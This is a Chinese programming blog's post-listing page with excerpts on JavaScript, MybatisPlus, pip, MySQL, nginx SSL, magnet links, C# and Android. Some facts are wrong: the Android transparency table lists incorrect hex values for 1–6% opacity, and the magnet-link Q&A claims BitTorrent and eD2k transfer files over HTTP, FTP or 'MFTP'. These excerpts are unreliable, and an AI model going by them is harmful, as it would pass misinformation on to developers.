<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd7cc76335742726d50c730196264b08/" rel="bookmark">
			js中一种将多层树状结构数组扁平化的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		js开发中我们有时候需要将一个复杂的多层树状结构数组简化处理为一个简单的单层结构数组，如何实现呢，看下面这个例子：
const arr = [{ id: 1, groupNum: 20, subs: [ { pareId: 1, id: 11, groupNum: 12, subs: [ { pareId: 11, id: 111, groupNum: 9 }, { pareId: 11, id: 112, groupNum: 3 } ] }, { pareId: 1, id: 12, groupNum: 8 } ]},{ id: 2, groupNum: 50, subs: [ { pareId: 2, id: 21, groupNum: 40, subs: [ { pareId: 21, id: 211, groupNum: 10 }, { pareId: 21, id: 212, groupNum: 10 }, { pareId: 21, id: 213, groupNum: 10 }, { pareId: 21, id: 214, groupNum: 10 } ] }, { pareId: 2, id: 22, groupNum: 10, subs: [ { pareId: 22, id: 221, groupNum: 5 }, { pareId: 22, id: 222, groupNum: 5 } ] } ] }] 现在要将上面复杂的arr转为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd7cc76335742726d50c730196264b08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b17ec2ea010eb2785947d264e066cbc/" rel="bookmark">
			MybatisPlus查询注解,使用注解即可实现复杂场景的查询需求、支持多表关联！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mybatis Plus 查询注解，复杂的查询业务需求通过QO + Query注解优雅的实现，提升开发效率。
1. 支持多表关联查询；
2. 支持所有查询条件 EQ、NOT_EQUAL、LIKE、LEFT LIKE、RIGHT LIKE、GT、LT、GE、LE、IN、NOT IN、EXISTS、NOT EXISTS、BETWEEN、IS NULL、NOT NULL 等等；
3. 支持AND、OR 嵌套；
4. 支持自定义排序。
使用示例：注解查询类 GoodsQO （关键代码）
import com.example.czy.annotation.Query; import com.example.czy.annotation.QueryOR; import io.swagger.annotations.ApiModelProperty; import lombok.Data; /** * @Author czy * @Date 2023-07-09 **/ @Data public class GoodsQO { /** * 多表关联查询时可以使用别名 如：g.id * 默认查询类型为 equal * id = */ @ApiModelProperty(value = "商品ID") @Query(field = "g.id") private Long id; /** * like可以指定为：left like、like、right like * name like '1%' */ @ApiModelProperty(value = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b17ec2ea010eb2785947d264e066cbc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33ea32323430cd72e2e58e1eac0b8ebb/" rel="bookmark">
			pip安装、升级和卸载Python包常用命令和用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 pip是Python的包管理工具，可以用于安装、升级和卸载Python包。以下是pip的一些常用命令和用法：
安装包：pip install package_name
这个命令可以安装指定的Python包。例如，要安装名为requests的包，可以运行以下命令：
pip install requests 升级包：pip install --upgrade package_name
这个命令可以升级指定的Python包。例如，要升级名为requests的包，可以运行以下命令：
pip install --upgrade requests 卸载包：pip uninstall package_name
这个命令可以卸载指定的Python包。例如，要卸载名为requests的包，可以运行以下命令：
pip uninstall requests 查看已安装的包：pip list
这个命令可以列出所有已安装的Python包。
查看包的版本号：pip show package_name
这个命令可以显示指定包的详细信息，包括版本号。例如，要查看名为requests的包的版本号，可以运行以下命令：
pip show requests 指定安装包的版本：pip install package_name==1.1.2
这个命令可以安装指定版本的Python包。例如，要安装requests包的1.1.2版本，可以运行以下命令：
pip install requests==1.1.2 设置pip的代理：pip --proxy user:passwd@proxy.server:port install package_name
这个命令可以在有代理的情况下安装Python包。例如，如果代理服务器的地址是proxy.server，端口是8080，用户名是user，密码是passwd，要安装名为requests的包，可以运行以下命令：
pip --proxy user:[passwd@proxy.server](mailto:passwd@proxy.server):8080 install requests 搜索Python包：pip search package_name
这个命令可以在PyPI（Python Package Index）中搜索Python包。例如，要搜索名为requests的包，可以运行以下命令：
pip search requests 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea96755db7f0c562f74c8c99be0dcaf3/" rel="bookmark">
			【Asp】asp中从数据库获取到的null的字段值如何判断？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、不为空的判断 if Trim(rs("jiedaishijian"))&amp;"0"&lt;&gt;"0" then end if
或者 len(trim(rs("jiedaishijian"))) &lt;&gt; 0
二、为空的判断 if Trim(rs("jiedaishijian"))&amp;"0"="0" then end if
三、从数据库中读取为null的，通过isnull判断不管用 isnull(rs("jiedaishijian")
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3411832b0f4e66b45c3e43350f57338/" rel="bookmark">
			mysql concat 和 concat_ws 区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CONCAT 和 CONCAT_WS 是 MySQL 中用于连接字符串的函数，但它们的使用方式和目的有所不同。
CONCAT 函数：
CONCAT 函数用于连接两个或多个字符串。它接受任意数量的参数，并按照它们在函数中出现的顺序进行连接。
示例：
SELECT CONCAT('Hello', ' ', 'World');
输出：
Hello World
CONCAT_WS 函数：
CONCAT_WS 函数也用于连接两个或多个字符串，但它与 CONCAT 的区别在于，CONCAT_WS 在连接字符串时可以指定一个分隔符。
示例：
SELECT CONCAT_WS(', ', 'apple', 'banana', 'orange');
输出：
apple, banana, orange
在上述示例中，CONCAT_WS 函数将字符串 'apple'、'banana' 和 'orange' 以逗号和空格作为分隔符连接起来。
CONCAT 函数用于简单地将字符串连接起来，而 CONCAT_WS 函数可以在连接字符串时指定一个分隔符。
在MySQL中，TAB键并不是一个特殊的键或保留字。它通常被用作制表符（tabulation character），用于在文本编辑中创建表格或对齐文本。
在MySQL的查询语句中，如果要在字符串连接中使用制表符，你可以使用CHAR(9)来表示制表符。例如，使用CONCAT函数将字符串与制表符连接起来：
sql
SELECT CONCAT('Hello', CHAR(9), 'World');
这将返回字符串"Hello World"，其中CHAR(9)表示制表符。
请注意，MySQL中的制表符只是一个普通的字符，它不会对查询结果产生特殊的影响。制表符只是用于在文本中创建对齐效果或在某些应用程序中用于分隔数据。
因为在Excel处理时候这个字符使用较多单独拿出陈述下
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34f1f5f77ed2d64ee1e64dcf52ea1da8/" rel="bookmark">
			RealityCapture 图像建模效果展示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、准备一只小鸭子
2.环绕小鸭子拍摄各个角度的照片并导入
3.使用工具配置模型的精细度、区域剔除、纹理生成、网格生成、贴图生成等参数，导出模型，这里选择了最高的精细度，可以看到模型面数相当惊人，生成网格时用了十几分钟。这模型是需要重新进行拓扑优化的，面数太多。
4.将生成的模型导入unity
5.应用贴图
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fbdad0c0ef1eb5400829faa48b5b35f/" rel="bookmark">
			C# wpf 实现任意控件（包括窗口）更多拖动功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章目录 第一章 Grid内控件拖动
第二章 Canvas内控件拖动
第三章 任意控件拖动
第四章 窗口拖动
第五章 附加属性实现任意拖动
第六章 拓展更多拖动功能（本章）
文章目录 系列文章目录前言一、添加的功能1、任意控件MoveTo2、任意控件DragMove3、边界限制4、窗口最大化拖动还原5、拖动事件 二、完整代码三、使用示例1、MoveTo2、DragMove3、边界限制4、窗口最大化拖动还原5、拖动事件 总结 前言 上一章我们以及实现了任意控件统一的拖动功能，以及能够方便的给任意控件添加拖动了。开发过程中发现还是有些功能可以继续拓展的，比如cs代码中移动控件、响应事件后触发拖动、限制拖动范围等功能。
一、添加的功能 在第五章基础上添加了如下功能。
1、任意控件MoveTo 这个功能相对简单，对不同类型的容器进行判断区分不同的移动逻辑即可。
代码示例如下：
/// &lt;summary&gt; /// 任意控件移动到指定坐标点 /// &lt;/summary&gt; /// &lt;param name="elememt"&gt;this&lt;/param&gt; /// &lt;param name="parentPoint"&gt;父容器的坐标点，之所以采样容器的坐标是因为，采样自身坐标控件位置改变后就会无效，采样屏幕坐标则需要自己换算dpi（PointToScreen不会做dpi换算）&lt;/param&gt; public static void MoveTo(this FrameworkElement elememt, Point parentPoint) { var parent = VisualTreeHelper.GetParent(elememt); if (parent is Canvas) { //Canvas移动逻辑 } else if (elememt is Window) { //Window移动逻辑 } else { //Grid或Transform移动逻辑，两种都能适用任意控件 } } 在拓展一个获取位置的方法，方便MoveTo使用
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2fbdad0c0ef1eb5400829faa48b5b35f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cac152826fac6b6d7b46175a2a7056fd/" rel="bookmark">
			fast-lio运行步骤（使用velodyne数据）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、新建工作空间，并clone源码
https://github.com/hku-mars/FAST_LIO.git 编译大概率会报错，提示缺少livox_ros_driver
二、安装livox驱动
可以单独新建一个工作空间，在src文件夹中，分别下载以下两个源码文件
git clone https://github.com/Livox-SDK/Livox-SDK.git git clone https://github.com/Livox-SDK/livox_ros_driver.git （1）cd 到SDK文件夹，编译
cd Livox-SDK cd build &amp;&amp; cmake .. make sudo make install （2）返回到工作空间下，使用catkin_make编译
三、配置fast-lio参数文件
使用fast-lio运行velodyne数据，需要使用到作者提供的mapping_velodyne.launch文件。
运行之前，需要根据实际情况，配置velodyne.yaml文件：
主要涉及lid_topic和imu_topic以及线束信息，可按照实际情况进行设置。
四、编译运行
配置完成后，再次编译fast-lio，此时即可顺利编译成功
运行：
roslaunch fast_lio mapping_velodyne.launch 播包：
rosbag play yourbagname.bag 效果：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2c0b6282ac8321053b5ad71752e400f/" rel="bookmark">
			【Python】基于base64对文本进行编码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		将字符串转换为Base64编码
import base64 """ 首先将原始字符串转换为字节，然后使用base64.b64encode()方法将字节转换为Base64编码 """ # 原始字符串 original_string = "Hello, World!" # 将字符串转换为字节 byte_string = original_string.encode('utf-8') print("byte_string: ", type(byte_string), byte_string) # &lt;class 'bytes'&gt; b'Hello, World!' # 将字节转换为Base64编码 base64_encoded = base64.b64encode(byte_string).decode('utf-8') print("Base64编码后的字符串：", type(base64_encoded), base64_encoded) # Base64编码后的字符串： &lt;class 'str'&gt; SGVsbG8sIFdvcmxkIQ== 将Base64编码的字符串解码为原始字符串
""" 将Base64编码的字符串解码为原始字符串，可以使用base64.b64decode()方法 """ import base64 # Base64编码后的字符串 base64_string = "SGVsbG8sIFdvcmxkIQ==" # 将Base64编码的字符串转换为字节 byte_string = base64.b64decode(base64_string) print("byte_string:" , type(byte_string), byte_string) # &lt;class 'bytes'&gt; b'Hello, World!' # 将字节转换为字符串 original_string = byte_string.decode('utf-8') print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2c0b6282ac8321053b5ad71752e400f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/584c835e850a215427defd3b76407bf1/" rel="bookmark">
			linux 执行命令报“\r‘: 未找到命令”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.在Windows上写好的脚本，放在Linux上运行，却出现了如下错误：
./startup.sh:行3: $'\r': 未找到命令 2、原因分析
两种操作系统平台对换行的解析不同造成的，Windows中\r\n表示换行，而在Linux中\n表示换行，所以在Windows上编写好的shell文件上传到Linux后，会因为不能识别\r而报错。因此办法之一就是\r替换掉，可以使用下面的命令来操作：
sed -i 's/\r//' test.sh 还可以使用dos2unix命令，该命令暂时未尝试。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d1bb0f9102ccf1883801f0410322245/" rel="bookmark">
			【已解决】nginx配置ssl，注意开启443端口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 注意事项一、Nginx 的 SSL 模块安装ssl证书地址ssl验证相关配置查看端口使用 注意事项 开启443端口
一、Nginx 的 SSL 模块安装 查看 nginx 是否安装 http_ssl_module 模块。
$ /usr/local/nginx/sbin/nginx -V 如果出现 configure arguments: –with-http_ssl_module, 则已安装（下面的步骤可以跳过，进入 nginx.conf 配置）。
下载 Nginx 安装包，当然是要去 Nginx 官网下载。
下载安装包到 src 目录
$ cd /usr/local/src $ wget http://nginx.org/download/nginx-1.15.9.tar.gz 解压安装包。
$ tar -zxvf nginx-1.15.9.tar.gz 配置 SSL 模块。
$ cd nginx-1.15.9 $ ./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module --with-debug 使用 make 命令编译（使用make install会重新安装nginx），此时当前目录会出现 objs 文件夹。
用新的 nginx 文件覆盖当前的 nginx 文件。
$ cp .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6d1bb0f9102ccf1883801f0410322245/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd1dcb100b2eb1f53775ffbaa0f6a9df/" rel="bookmark">
			关于磁力链接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		磁力链接（Magnet URI scheme）是一种特殊的链接，它主要用于在分布式网络（如BitTorrent协议）中搜索和下载文件。与基于位置的链接（如URL）不同，磁力链接是基于文件内容的元数据，而不是基于文件的IP地址或定位符。
具体来说，磁力链接包含了一个散列函数值，这个值是根据文件的内容计算得出的。在BitTorrent协议中，这个散列函数值被称为InfoHash。通过InfoHash，磁力链接可以唯一地标识一个文件，并且可以在对等网络中搜索和下载该文件。
磁力链接的优点在于它不需要一个中心服务器来下载文件。由于文件的内容被散列函数处理后，以一种特定的方式编码成InfoHash，所以用户可以在对等网络中找到拥有该文件所有数据块的用户集合，即所谓的"swarm"。然后，用户可以从这些用户那里获取文件的各个数据块，从而完成文件的下载。
总之，磁力链接是一种基于元数据和散列函数的特殊链接，它主要用于在分布式网络中搜索和下载文件。通过磁力链接，用户可以在对等网络中找到并下载所需的文件，而不需要依赖中心服务器。
什么是元数据，什么是散列函数，什么是swarm 元数据（Metadata）是关于数据的数据，或者说是描述数据的数据。它可以描述数据的属性，比如数据的名称、格式、来源、日期等。在数字图书馆领域，元数据被用来描述电子资源的属性，如标题、作者、出版日期等。
散列函数（Hash Function）是一种将输入（如文件）转化为一个固定长度输出的算法。这个输出通常被称为散列值或哈希值。散列函数具有如下特性：如果输入的改变，哪怕只是微小的改变，都会导致输出的散列值发生很大的变化。
在BitTorrent协议中，swarm是由许多同时下载相同文件的用户组成的。每个用户都会从其他用户那里获取文件的各个数据块，并且也会将自己的数据块上传给其他用户。Swarm的工作原理是，当一个用户需要下载一个文件时，它首先会在网络上寻找拥有该文件所有数据块的用户集合，即所谓的"swarm"。然后，该用户可以从这些用户那里获取文件的各个数据块，从而完成文件的下载。
磁力链接需要特定的软件或者支持该协议的软件解析吗 是的，磁力链接需要特定的软件或支持该协议的软件进行解析。通常情况下，这些软件包括BitTorrent客户端（如uTorrent、比特精灵等）和某些支持磁力链接的浏览器（如Vivaldi等）。
这些软件可以解析磁力链接，并将其转化为可下载的资源。具体来说，当用户打开一个磁力链接时，软件会根据链接中的元数据信息，如文件名、文件大小等，去寻找可用的下载资源。一旦找到可用的资源，软件就会开始下载文件。
需要注意的是，由于磁力链接是基于BitTorrent协议的，因此在使用磁力链接下载文件时，需要遵守相关的法律法规和版权规定。同时，由于BitTorrent协议是点对点（P2P）的文件共享协议，因此下载速度和稳定性也取决于网络中其他用户的参与情况和网络状况。
磁力链接和种子的关系区别，是不是支持bit torrent协议的软件都能解析磁力链接 ？ .torrent文件解析后一般是url还是磁力链接还是其他？ 磁力链接和种子都是BitTorrent协议中用于标识和下载文件的方式，但它们之间有一些区别。
磁力链接是基于文件内容的散列函数值，它是一种纯文本的“数字指纹”，用来识别文件的。磁力链接通过不同文件内容的Hash结果生成，以“magnet:?xt=urn:btih:”开头，后面跟着文件的Hash值。它的优点在于完全“去中心化”，即不需要中心服务器来下载文件，只需要找到拥有文件所有数据块的用户集合（swarm），然后从这些用户那里获取文件的各个数据块即可。
种子文件是以“.torrent”结尾的文件，它包含了要下载文件的索引和元数据信息，可以用来发现和下载文件。种子文件中包含了一个或多个文件的Hash值和其他元数据信息，通过使用BitTorrent客户端软件打开和解析种子文件，可以获取到文件的磁力链接。
对于支持BitTorrent协议的软件能否解析磁力链接的问题，一般来说是可以的。大多数支持BitTorrent协议的软件都能够解析磁力链接并下载文件。但是，不同的软件可能具有不同的功能和特性，因此在使用时需要确认该软件是否支持磁力链接的解析和下载。
至于种子文件解析后一般是URL还是磁力链接或其他形式的问题，一般来说，种子文件解析后会生成一个或多个文件的磁力链接。这些磁力链接可以用来下载文件，但是需要注意的是，由于BitTorrent协议是点对点（P2P）的文件共享协议，下载速度和稳定性也取决于网络中其他用户的参与情况和网络状况。
磁力链接的格式 磁力链接的格式通常以“magnet:?”开头，后面跟着一系列参数，其中包括文件的散列值、文件名、文件大小等信息。例如，一个常见的磁力链接形式为“magnet:?xt=urn:btih:”，其中“btih”后面跟着的是文件的SHA-1散列值。
磁力链接的本质是基于文件内容的散列值来标识文件，这个散列值是通过特定的散列算法计算得出的。因此，只要文件的内容不变，无论文件被存储在哪个位置，都可以通过相同的散列值来生成相同的磁力链接，从而实现对等网络中的文件共享和下载。
解析磁力链接过程中通过什么寻找有相同散列值的用户 在解析磁力链接的过程中，是通过BitTorrent协议中的DHT（分布式哈希表）来寻找具有相同散列值的用户的。
DHT是一种分布式的数据存储和检索技术，它可以将文件信息存储在多个节点上，以便在分布式网络中实现高效的搜索和下载。在BitTorrent协议中，每个文件都有一个唯一的散列值，文件的元数据信息（包括文件名、文件大小等）也会被存储在DHT中。
当一个用户解析一个磁力链接时，如果该链接对应的文件的散列值与用户正在寻找的文件的散列值相同，那么用户就可以通过DHT来搜索具有相同散列值的节点，这些节点可能是其他用户或者服务器。一旦找到具有相同散列值的节点，用户就可以从这些节点中获取文件的各个数据块，从而完成文件的下载。
解析ed2k的时候是不是直接通过hash值和DHT进行寻找资源 是的，解析eD2k链接时，会通过文件的哈希值和DHT（分布式哈希表）进行寻找资源。文件的哈希值是文件的唯一标识符，可以用于在P2P网络中查找和交换文件。DHT是一种分布式的数据存储和检索技术，它可以将文件信息存储在多个节点上，以便在分布式网络中实现高效的搜索和下载。
当解析一个eD2k链接时，首先需要获取文件的哈希值，然后使用DHT技术在P2P网络中搜索具有相同哈希值的文件。如果找到了具有相同哈希值的文件，就可以从其他用户的计算机上下载该文件。
需要注意的是，由于P2P网络的开放性和匿名性，用户在下载文件时需要谨慎选择可靠的来源和文件，以避免下载到假文件或病毒文件。
找到资源后通过什么协议传输 在eD2k协议中，文件传输是通过HTTP或FTP等协议进行的。当用户找到所需的文件后，可以直接使用HTTP或FTP协议将文件从其他用户的计算机下载到自己的计算机上。
此外，eD2k还支持使用MFTP（多源文件传输协议）进行文件传输。MFTP是一种专门为eD2k协议设计的文件传输协议，它可以同时从多个来源下载文件，提高了下载速度和稳定性。
需要注意的是，由于P2P网络的开放性和匿名性，用户在下载文件时需要谨慎选择可靠的来源和文件，以避免下载到假文件或病毒文件。
那么磁力链接通过bit torrent协议解析找到资源后也是通过这三个协议传输资源吗 是的，磁力链接通过BitTorrent协议解析找到资源后，也是通过HTTP、FTP或MFTP等协议进行资源传输的。
在BitTorrent协议中，每个文件块都会被分配一个唯一的块ID，并且每个文件块都会使用HTTP或FTP协议进行传输。同时，MFTP（多源文件传输协议）也可以同时从多个来源下载文件，提高了下载速度和稳定性。
需要注意的是，由于P2P网络的开放性和匿名性，用户在下载文件时需要谨慎选择可靠的来源和文件，以避免下载到假文件或病毒文件。
磁力链接与ed2k链接的关系与区别 磁力链接和eD2k链接都是用于在P2P网络中共享和下载文件的链接，但它们之间有一些关系和区别。
相同点：
磁力链接和eD2k链接都是基于P2P技术的文件共享方式，允许用户从其他用户的计算机上下载文件。
它们都使用唯一的标识符（哈希值或其他）来标识和查找文件。
用户可以使用这些链接来搜索、下载和共享各种类型的文件，如音乐、视频、图片、文档等。
不同点：
磁力链接使用磁力链接协议（Magnet URI scheme），而eD2k链接使用eDonkey2000协议。
磁力链接不依赖于特定的文件存储位置或服务器，而是通过散列函数值来识别和搜索文件。而eD2k链接则是通过eMule等P2P软件来查找和下载文件。
磁力链接的格式通常以“magnet:?”开头，后面跟着一系列参数，其中包括文件的散列值、文件名、文件大小等信息。而eD2k链接的格式通常为“ed2k://”。
磁力链接可以在没有中心服务器的对等网络中使用，特别适用于没有中心服务器的环境。而eD2k链接则需要通过eMule等P2P软件连接到eDonkey网络来下载文件。
综上所述，磁力链接和eD2k链接都是用于在P2P网络中共享和下载文件的链接，具有一些相似之处，但也存在一些差异。用户可以根据自己的需求和偏好选择适合的链接方式进行文件共享和下载。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46c0e972f1b84813cc986b2f69e7b42b/" rel="bookmark">
			【C#】读取ini配置文件的内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、编写ini配置文件 ini文件时初始化文件，通常是系统配置文件所采用的存储格式。ini文件有自己的固定格式，是由若干个“节”（section）组成，每个节由若干个“键”（key）组成，每个key可以赋值相应的“值”（value）。
以下是ini文件的示例，我们将读取name的值。我这里的项目是窗体应用程序。
[section] name=aline age=18 二、效果图 三、C# 读取ini文件 using System; using System.Collections.Generic; using System.ComponentModel; using System.Data; using System.Drawing; using System.Text; using System.Windows.Forms; using System.IO; using System.Runtime.InteropServices; namespace WindowsFormsApplication1 { public partial class Form1 : Form { public Form1() { InitializeComponent(); } #region API函数声明 [DllImport("kernel32")]//返回取得字符串缓冲区的长度 private static extern long GetPrivateProfileString(string section, string key, string def, StringBuilder retVal, int size, string filePath); #endregion #region 读Ini文件 public static string ReadIniData(string Section, string Key, string NoText, string iniFilePath) { if (File.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46c0e972f1b84813cc986b2f69e7b42b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfadfe5837cad047e31ed361287ad758/" rel="bookmark">
			Leetcode题库（数据库合集）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 难度：简单1. 组合两个表2. 第二高的薪水3. 第N高的薪水4. 分数排名5. 连续出现的数字6. 超过经理收入的员工7. 重新8. 寻找用户推荐人9. 销售员10. 排名靠前的旅行者11. 患某种疾病的患者12. 修复表中的名字13. 求关注者的数量14. 可回收且低脂的产品15. 计算特殊奖金16. 丢失信息的雇员17. 每个产品在不同商店的价格18. 文章浏览19. 上升的温度20. 按日期分组销售产品21. 员工奖金22. 使用唯一标识码替换员工Id23. 订单最多的客户24. 判断三角形25. 只出现一次的最大数字26. 平均售价27. 查找拥有有效邮箱的用户28. 查询结果的质量和占比29. 列出指定时间段内所有的下单产品30. 最高薪水差异31. 总旅行距离32. 自行车的最后使用时间33. 统计 Spotify 排行榜上艺术家出现次数34. 查询员工当前薪水35. 把名字和职业联系起来36. 形成化学键37. 整理奥运表38. 每位教师所教授的科目种类的数量39. 联赛的所有比赛39. 产品销售分析 ⑤ 难度：中等1.股票的资本损益2. 当选者3. 页面推荐4. 2016年的投资5. 买下所有产品的人6. 电影评分6. 确认率7. 按分类统计薪水8. 餐馆营业额的变化增长8. 即时食物配送 ①9. 至少有5名直系下属的经理10. 游戏玩法分析11. 好友申请：谁有最多的好友12. 指定日期的产品价格13. 每月交易14.市场分析15. 即时食物配送 ②16. 计算税后工资17. 选举结果18. 航班入座率和等待名单分析19. 统计文本中单词出现的次数20. 查找活跃用户21. 计算每个销售人员的影响力22. 坚定的友谊23.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfadfe5837cad047e31ed361287ad758/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bb803f8138c382b89aaa5d25a07759f/" rel="bookmark">
			Android 透明度颜色值对照表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、透明度对照表 注：00是完全透明，FF就是完全不透明
我们的UI小姐姐就喜欢给「不透明度」，这个需要自己判断一下。
完全透明:0% HEX: 00 透明度:1% HEX: 30 透明度:2% HEX: 50 透明度:3% HEX: 80 透明度:4% HEX: A0 透明度:5% HEX: D0 透明度:6% HEX: F0 透明度:7% HEX: 12 透明度:8% HEX: 14 透明度:9% HEX: 17 透明度:10% HEX: 1A 透明度:11% HEX: 1C 透明度:12% HEX: 1F 透明度:13% HEX: 21 透明度:14% HEX: 24 透明度:15% HEX: 26 透明度:16% HEX: 29 透明度:17% HEX: 2B 透明度:18% HEX: 2E 透明度:19% HEX: 30 透明度:20% HEX: 33 透明度:21% HEX: 36 透明度:22% HEX: 38 透明度:23% HEX: 3B 透明度:24% HEX: 3D 透明度:25% HEX: 40 透明度:26% HEX: 42 透明度:27% HEX: 45 透明度:28% HEX: 47 透明度:29% HEX: 4A 透明度:30% HEX: 4D 透明度:31% HEX: 4F 透明度:32% HEX: 52 透明度:33% HEX: 54 透明度:34% HEX: 57 透明度:35% HEX: 59 透明度:36% HEX: 5C 透明度:37% HEX: 5E 透明度:38% HEX: 61 透明度:39% HEX: 63 透明度:40% HEX: 66 透明度:41% HEX: 69 透明度:42% HEX: 6B 透明度:43% HEX: 6E 透明度:44% HEX: 70 透明度:45% HEX: 73 透明度:46% HEX: 75 透明度:47% HEX: 78 透明度:48% HEX: 7A 透明度:49% HEX: 7D 透明度:50% HEX: 80 透明度:51% HEX: 82 透明度:52% HEX: 85 透明度:53% HEX: 87 透明度:54% HEX: 8A 透明度:55% HEX: 8C 透明度:56% HEX: 8F 透明度:57% HEX: 91 透明度:58% HEX: 94 透明度:59% HEX: 96 透明度:60% HEX: 99 透明度:61% HEX: 9C 透明度:62% HEX: 9E 透明度:63% HEX: A1 透明度:64% HEX: A3 透明度:65% HEX: A6 透明度:66% HEX: A8 透明度:67% HEX: AB 透明度:68% HEX: AD 透明度:69% HEX: B0 透明度:70% HEX: B3 透明度:71% HEX: B5 透明度:72% HEX: B8 透明度:73% HEX: BA 透明度:74% HEX: BD 透明度:75% HEX: BF 透明度:76% HEX: C2 透明度:77% HEX: C4 透明度:78% HEX: C7 透明度:79% HEX: C9 透明度:80% HEX: CC 透明度:81% HEX: CF 透明度:82% HEX: D1 透明度:83% HEX: D4 透明度:84% HEX: D6 透明度:85% HEX: D9 透明度:86% HEX: DB 透明度:87% HEX: DE 透明度:88% HEX: E0 透明度:89% HEX: E3 透明度:90% HEX: E6 透明度:91% HEX: E8 透明度:92% HEX: EB 透明度:93% HEX: ED 透明度:94% HEX: F0 透明度:95% HEX: F2 透明度:96% HEX: F5 透明度:97% HEX: F7 透明度:98% HEX: FA 透明度:99% HEX: FC 不透明:100% HEX: FF 二、透明度介绍
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0bb803f8138c382b89aaa5d25a07759f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7473ed72656a0b9da93edfa59704f74/" rel="bookmark">
			过去，我买漫画看；现在，我用Python爬虫来看
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原标题：运用Python多线程爬虫下载漫画 以前，我都是买漫画书看的，那个时候没有电脑。今天，我到网上看了一下，发现网上提供漫画看，但是时时需要网络啊！为什么不将它下载下来呢！
